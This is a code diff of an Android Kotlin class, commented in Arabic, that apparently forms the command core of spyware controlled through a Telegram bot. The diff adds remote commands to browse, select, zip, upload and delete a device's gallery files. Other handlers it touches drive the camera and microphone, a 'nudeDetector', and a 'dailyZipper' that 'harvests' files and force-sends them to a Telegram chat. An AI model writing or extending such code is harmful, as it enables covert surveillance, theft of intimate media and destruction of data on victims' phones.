@@ -22,11 +22,9 @@ import com.example.app.CallbackData
  * فئة إدارة الأوامر الرئيسية للتحكم بكاميرا الجهاز، الميكروفون، المعرض والحصاد.
  * هذه الفئة هي بديل commands.py مع حذف أوامر SMS وسجل الاتصالات.
  * 
- * تم إصلاح أسماء الحقول المستخدمة في Reflection لتطابق الأسماء الفعلية في Monitor:
- * - camera_analyzer → cameraAnalyzer
- * - daily_zipper → dailyZipper
- * - gallery_browser → mediaScanner (لأن MediaScanner يرث من GalleryBrowser)
- * - nude_detector → nudeDetector (تم إصلاحه مسبقاً)
+ * ✅ تم إضافة دعم الأوامر الجديدة للمعرض (g_toggle, g_selall, g_zip, g_upload, g_del_sel, g_conf_del, g_conf_del_one).
+ * ✅ تم إصلاح g_conf لاستخدام g_conf_del_one بدلاً من g_act|del للتوافق مع النظام الجديد.
+ * ✅ تم تحسين معالجة messageId وتحديث last_mid في Monitor.
  */
 class Commands private constructor(context: Context) {
 
@@ -192,7 +190,6 @@ class Commands private constructor(context: Context) {
         return ContextCompat.checkSelfPermission(ctx, permission) == PackageManager.PERMISSION_GRANTED
     }
 
-    // ✅ تم إصلاح الدالة: استخدام getBatteryStatus بدلاً من _battery_ok
     private fun isBatteryOk(m: Any?): Boolean {
         if (m == null) return true
         return try {
@@ -462,11 +459,19 @@ class Commands private constructor(context: Context) {
                 ensureComponents(m)
 
                 when {
+                    // أوامر المعرض القديمة والجديدة
                     cmd.startsWith("g_nav|") ||
                     cmd.startsWith("g_opt|") ||
                     cmd.startsWith("g_conf|") ||
                     cmd.startsWith("g_act|") ||
-                    cmd.startsWith("g_bulk|") -> handleGallery(cmd, tg, m, cid)
+                    cmd.startsWith("g_bulk|") ||
+                    cmd.startsWith("g_toggle|") ||
+                    cmd.startsWith("g_selall|") ||
+                    cmd.startsWith("g_zip|") ||
+                    cmd.startsWith("g_upload|") ||
+                    cmd.startsWith("g_del_sel|") ||
+                    cmd.startsWith("g_conf_del|") ||
+                    cmd.startsWith("g_conf_del_one|") -> handleGallery(cmd, tg, m, cid)
 
                     cmd.startsWith("cam_") || cmd.startsWith("camf_") -> handleCamera(cmd, tg, m, cid)
 
@@ -485,7 +490,6 @@ class Commands private constructor(context: Context) {
                 Log.e(TAG, "Command handler error: ${e.message}")
                 sendTelegramMessage(tg, cid, "❌ خطأ داخلي: ${e.message?.take(100) ?: "Unknown"}")
             }
-            // ✅ تم إزالة System.gc() نهائياً لتحسين الأداء
         }
     }
 
@@ -496,7 +500,6 @@ class Commands private constructor(context: Context) {
     private suspend fun ensureComponents(m: Any?) {
         if (m == null) return
         try {
-            // ✅ تم إصلاح اسم الحقل: nude_detector -> nudeDetector
             val nudeDetector = getModuleComponent(m, "nudeDetector")
             if (nudeDetector == null) {
                 Log.w(TAG, "nudeDetector not loaded, attempting to load...")
@@ -507,17 +510,18 @@ class Commands private constructor(context: Context) {
     }
 
     // ============================================================
-    //  معالج أوامر المعرض (Gallery)
-    // ✅ تم إصلاح اسم الحقل: gallery_browser -> mediaScanner
+    //  معالج أوامر المعرض (Gallery) – دعم كامل للأوامر الجديدة والقديمة
     // ============================================================
 
     private suspend fun handleGallery(cmd: String, tg: Any?, m: Any?, cid: Long) {
         try {
             val parts = cmd.split("|")
-            if (parts.size < 2) return
+            if (parts.size < 2) {
+                sendTelegramMessage(tg, cid, "⚠️ أمر غير مكتمل")
+                return
+            }
 
             val action = parts[0]
-            // ✅ استخدام mediaScanner بدلاً من gallery_browser
             val galleryBrowser = getModuleComponent(m, "mediaScanner")
 
             if (galleryBrowser == null) {
@@ -525,73 +529,202 @@ class Commands private constructor(context: Context) {
                 return
             }
 
+            // الحصول على آخر message_id من Monitor (للأوامر التي تحتاج تحديث)
+            val lastMid = getModuleField(m, "last_mid") as? Long
+
             when (action) {
+                // التنقل بين الصفحات
                 "g_nav" -> {
                     if (parts.size >= 3) {
                         val cat = parts[1]
                         val page = parts[2].toIntOrNull() ?: 0
                         val newKb = invokeMethod(galleryBrowser, "getGridKb", cat, page)
-                        val lastMid = getModuleField(m, "last_mid")
-                        invokeTelegramMethod(
-                            tg,
-                            "editMessageReplyMarkup",
-                            mapOf(
-                                "chat_id" to cid,
-                                "message_id" to (lastMid ?: 0),
-                                "reply_markup" to (newKb?.toString() ?: "")
+                        if (newKb != null) {
+                            val msgId = lastMid ?: 0
+                            invokeTelegramMethod(
+                                tg,
+                                "editMessageReplyMarkup",
+                                mapOf(
+                                    "chat_id" to cid,
+                                    "message_id" to msgId,
+                                    "reply_markup" to newKb.toString()
+                                )
                             )
-                        )
+                        } else {
+                            sendTelegramMessage(tg, cid, "⚠️ فشل تحديث المعرض")
+                        }
                     }
                 }
 
+                // عرض خيارات ملف (معاينة)
                 "g_opt" -> {
                     if (parts.size >= 4) {
                         invokeMethod(galleryBrowser, "showOptions", cid, parts[1], parts[2], parts[3])
                     }
                 }
 
+                // الإجراءات القديمة (g_act) – تستخدم للتوافق مع الأوامر القديمة
                 "g_act" -> {
                     if (parts.size >= 5) {
+                        val subAction = parts[1]
+                        val cat = parts[2]
+                        val page = parts[3].toIntOrNull() ?: 0
+                        val index = parts[4].toIntOrNull() ?: -1
                         invokeMethod(
                             galleryBrowser,
                             "executeAction",
                             cid,
-                            parts[1],
-                            parts[2],
-                            parts[3],
-                            parts[4]
+                            subAction,
+                            cat,
+                            page,
+                            index,
+                            lastMid
                         )
                     }
                 }
 
+                // تأكيد الحذف (للأوامر القديمة – تم تعديله لاستخدام g_conf_del_one)
                 "g_conf" -> {
                     if (parts.size >= 5) {
                         val act = parts[1]
                         val cat = parts[2]
                         val pg = parts[3]
                         val idx = parts[4]
-                        val confirmKb = listOf(
-                            listOf(
-                                mapOf(
-                                    "text" to "🗑 نعم، احذف",
-                                    "callback_data" to "g_act|del|$cat|$pg|$idx"
-                                ),
-                                mapOf(
-                                    "text" to "🔙 إلغاء",
-                                    "callback_data" to "g_opt|$cat|$pg|$idx"
+                        // إذا كان الإجراء del، نستخدم g_conf_del_one (النظام الجديد)
+                        if (act == "del") {
+                            val confirmKb = listOf(
+                                listOf(
+                                    mapOf(
+                                        "text" to "🗑️ نعم، احذف",
+                                        "callback_data" to "g_conf_del_one|$cat|$pg|$idx"
+                                    ),
+                                    mapOf(
+                                        "text" to "🔙 إلغاء",
+                                        "callback_data" to "g_opt|$cat|$pg|$idx"
+                                    )
                                 )
                             )
-                        )
-                        val jsonKb = JSONObject(mapOf("inline_keyboard" to confirmKb)).toString()
-                        sendTelegramMessage(tg, cid, "⚠️ هل أنت متأكد من الحذف؟", jsonKb)
+                            val jsonKb = JSONObject(mapOf("inline_keyboard" to confirmKb)).toString()
+                            sendTelegramMessage(tg, cid, "⚠️ هل أنت متأكد من حذف هذا الملف؟", jsonKb)
+                        } else {
+                            // للأوامر القديمة الأخرى (إن وجدت)
+                            val confirmKb = listOf(
+                                listOf(
+                                    mapOf(
+                                        "text" to "🗑️ نعم، احذف",
+                                        "callback_data" to "g_act|$act|$cat|$pg|$idx"
+                                    ),
+                                    mapOf(
+                                        "text" to "🔙 إلغاء",
+                                        "callback_data" to "g_opt|$cat|$pg|$idx"
+                                    )
+                                )
+                            )
+                            val jsonKb = JSONObject(mapOf("inline_keyboard" to confirmKb)).toString()
+                            sendTelegramMessage(tg, cid, "⚠️ هل أنت متأكد؟", jsonKb)
+                        }
                     }
                 }
 
+                // حذف مجموعة (قديم)
                 "g_bulk" -> {
                     if (parts.size >= 3) {
                         val cat = parts[1]
                         val page = parts[2].toIntOrNull() ?: 0
-                        invokeMethod(galleryBrowser, "executeAction", cid, "bulk", cat, page)
+                        invokeMethod(galleryBrowser, "executeAction", cid, "del_page", cat, page, null, lastMid)
+                    }
+                }
+
+                // ========== الأوامر الجديدة ==========
+
+                // تبديل تحديد ملف
+                "g_toggle" -> {
+                    if (parts.size >= 4) {
+                        val cat = parts[1]
+                        val page = parts[2].toIntOrNull() ?: 0
+                        val index = parts[3].toIntOrNull() ?: -1
+                        invokeMethod(galleryBrowser, "executeAction", cid, "toggle", cat, page, index, lastMid)
+                    }
+                }
+
+                // تحديد/إلغاء الكل في الصفحة
+                "g_selall" -> {
+                    if (parts.size >= 3) {
+                        val cat = parts[1]
+                        val page = parts[2].toIntOrNull() ?: 0
+                        invokeMethod(galleryBrowser, "executeAction", cid, "selall", cat, page, null, lastMid)
+                    }
+                }
+
+                // ضغط المحدد
+                "g_zip" -> {
+                    if (parts.size >= 3) {
+                        val cat = parts[1]
+                        val page = parts[2].toIntOrNull() ?: 0
+                        invokeMethod(galleryBrowser, "executeAction", cid, "zip", cat, page, null, lastMid)
+                    }
+                }
+
+                // تحميل المحدد
+                "g_upload" -> {
+                    if (parts.size >= 3) {
+                        val cat = parts[1]
+                        val page = parts[2].toIntOrNull() ?: 0
+                        invokeMethod(galleryBrowser, "executeAction", cid, "upload", cat, page, null, lastMid)
+                    }
+                }
+
+                // حذف المحدد
+                "g_del_sel" -> {
+                    if (parts.size >= 3) {
+                        val cat = parts[1]
+                        val page = parts[2].toIntOrNull() ?: 0
+                        invokeMethod(galleryBrowser, "executeAction", cid, "del_sel", cat, page, null, lastMid)
+                    }
+                }
+
+                // تأكيد حذف الصفحة (يظهر أزرار تأكيد)
+                "g_conf_del" -> {
+                    if (parts.size >= 3) {
+                        val cat = parts[1]
+                        val page = parts[2].toIntOrNull() ?: 0
+                        val confirmKb = listOf(
+                            listOf(
+                                mapOf(
+                                    "text" to "🗑️ نعم، احذف الصفحة كلها",
+                                    "callback_data" to "g_act|del_page|$cat|$page|0"
+                                ),
+                                mapOf(
+                                    "text" to "🔙 إلغاء",
+                                    "callback_data" to "g_nav|$cat|$page"
+                                )
+                            )
+                        )
+                        val jsonKb = JSONObject(mapOf("inline_keyboard" to confirmKb)).toString()
+                        sendTelegramMessage(tg, cid, "⚠️ هل أنت متأكد من حذف كل ملفات الصفحة ${page + 1}؟", jsonKb)
+                    }
+                }
+
+                // تأكيد حذف ملف واحد
+                "g_conf_del_one" -> {
+                    if (parts.size >= 4) {
+                        val cat = parts[1]
+                        val page = parts[2].toIntOrNull() ?: 0
+                        val index = parts[3].toIntOrNull() ?: -1
+                        val confirmKb = listOf(
+                            listOf(
+                                mapOf(
+                                    "text" to "🗑️ نعم، احذف هذا الملف",
+                                    "callback_data" to "g_act|del_one|$cat|$page|$index"
+                                ),
+                                mapOf(
+                                    "text" to "🔙 إلغاء",
+                                    "callback_data" to "g_opt|$cat|$page|$index"
+                                )
+                            )
+                        )
+                        val jsonKb = JSONObject(mapOf("inline_keyboard" to confirmKb)).toString()
+                        sendTelegramMessage(tg, cid, "⚠️ هل أنت متأكد من حذف هذا الملف؟", jsonKb)
                     }
                 }
             }
@@ -603,7 +736,6 @@ class Commands private constructor(context: Context) {
 
     // ============================================================
     //  معالج أوامر الكاميرا
-    // ✅ تم إصلاح اسم الحقل: camera_analyzer -> cameraAnalyzer
     // ============================================================
 
     private suspend fun handleCamera(cmd: String, tg: Any?, m: Any?, cid: Long) {
@@ -615,7 +747,6 @@ class Commands private constructor(context: Context) {
                 return
             }
 
-            // ✅ استخدام cameraAnalyzer بدلاً من camera_analyzer
             val cameraAnalyzer = getModuleComponent(m, "cameraAnalyzer")
             if (cameraAnalyzer == null) {
                 sendTelegramMessage(tg, cid, "❌ الكاميرا غير متاحة")
@@ -677,12 +808,10 @@ class Commands private constructor(context: Context) {
 
     // ============================================================
     //  معالج الحصاد (Harvest)
-    // ✅ تم إصلاح اسم الحقل: daily_zipper -> dailyZipper
     // ============================================================
 
     private suspend fun handleHarvest(tg: Any?, m: Any?, cid: Long) {
         try {
-            // ✅ استخدام dailyZipper بدلاً من daily_zipper
             val dailyZipper = getModuleComponent(m, "dailyZipper")
             if (dailyZipper != null) {
                 sendTelegramMessage(tg, cid, "📦 بدء الحصاد... قد يستغرق دقائق")
@@ -704,12 +833,10 @@ class Commands private constructor(context: Context) {
 
     // ============================================================
     //  معالج الإرسال الفوري (Send Now)
-    // ✅ تم إصلاح اسم الحقل: daily_zipper -> dailyZipper
     // ============================================================
 
     private suspend fun handleSendNow(tg: Any?, m: Any?, cid: Long) {
         try {
-            // ✅ استخدام dailyZipper بدلاً من daily_zipper
             val dailyZipper = getModuleComponent(m, "dailyZipper")
             if (dailyZipper != null) {
                 sendTelegramMessage(tg, cid, "🚀 جاري إرسال الملفات المضغوطة فوراً...")
@@ -734,12 +861,10 @@ class Commands private constructor(context: Context) {
 
     // ============================================================
     //  معالج فتح المعرض (Media)
-    // ✅ تم إصلاح اسم الحقل: gallery_browser -> mediaScanner
     // ============================================================
 
     private suspend fun handleMedia(tg: Any?, m: Any?, cid: Long) {
         try {
-            // ✅ استخدام mediaScanner بدلاً من gallery_browser
             val galleryBrowser = getModuleComponent(m, "mediaScanner")
             if (galleryBrowser != null) {
                 val kb = invokeMethod(galleryBrowser, "getGridKb", "pending", 0)
@@ -747,7 +872,10 @@ class Commands private constructor(context: Context) {
                 val response = sendTelegramMessage(tg, cid, "🖼️ معرض الوسائط", jsonKb)
                 val msgId = response.safeGetMessageId()
                 if (msgId != null) {
+                    // تحديث last_mid في Monitor
                     setModuleField(m, "last_mid", msgId)
+                    // تحديث lastMessageIdMap في GalleryBrowser
+                    invokeMethod(galleryBrowser, "updateLastMessageId", cid, msgId)
                 }
             } else {
                 sendTelegramMessage(tg, cid, "❌ المعرض غير متاح")
@@ -760,13 +888,11 @@ class Commands private constructor(context: Context) {
 
     // ============================================================
     //  الدوال الخارجية لنظام التحكم
-    // ✅ تم إصلاح اسم الحقل: daily_zipper -> dailyZipper
     // ============================================================
 
     fun forceSendZip(m: Any?, deviceId: String, tg: Any?, chatId: Long) {
         scope.launch {
             try {
-                // ✅ استخدام dailyZipper بدلاً من daily_zipper
                 val dailyZipper = getModuleComponent(m, "dailyZipper")
                 if (dailyZipper != null) {
                     invokeMethod(dailyZipper, "forceSendNow", chatId)
@@ -818,11 +944,7 @@ class Commands private constructor(context: Context) {
     }
 
     /**
-     * استدعاء دالة على كائن عبر الانعكاس مع مطابقة عدد المعاملات لتجنب مشاكل الـ Overloading.
-     * @param target الكائن المستهدف
-     * @param methodName اسم الدالة
-     * @param args المعاملات
-     * @return نتيجة استدعاء الدالة أو null في حالة الفشل
+     * استدعاء دالة على كائن عبر الانعكاس مع مطابقة عدد المعاملات.
      */
     private fun invokeMethod(target: Any?, methodName: String, vararg args: Any?): Any? {
         if (target == null) return null
@@ -887,12 +1009,8 @@ class Commands private constructor(context: Context) {
     private suspend fun sendTelegramVoice(tg: Any?, chatId: Any, voiceFile: File): Boolean {
         if (tg == null) return false
         return try {
-            val params = mapOf(
-                "chat_id" to chatId
-            )
-            val files = mapOf(
-                "voice" to voiceFile
-            )
+            val params = mapOf("chat_id" to chatId)
+            val files = mapOf("voice" to voiceFile)
             val result = invokeMethod(tg, "_api", "sendVoice", params, files)
             if (result != null) {
                 val json = result as? JSONObject
@@ -913,9 +1031,7 @@ class Commands private constructor(context: Context) {
                 "chat_id" to chatId,
                 "caption" to caption
             )
-            val files = mapOf(
-                "document" to documentFile
-            )
+            val files = mapOf("document" to documentFile)
             val result = invokeMethod(tg, "_api", "sendDocument", params, files)
             if (result != null) {
                 val json = result as? JSONObject
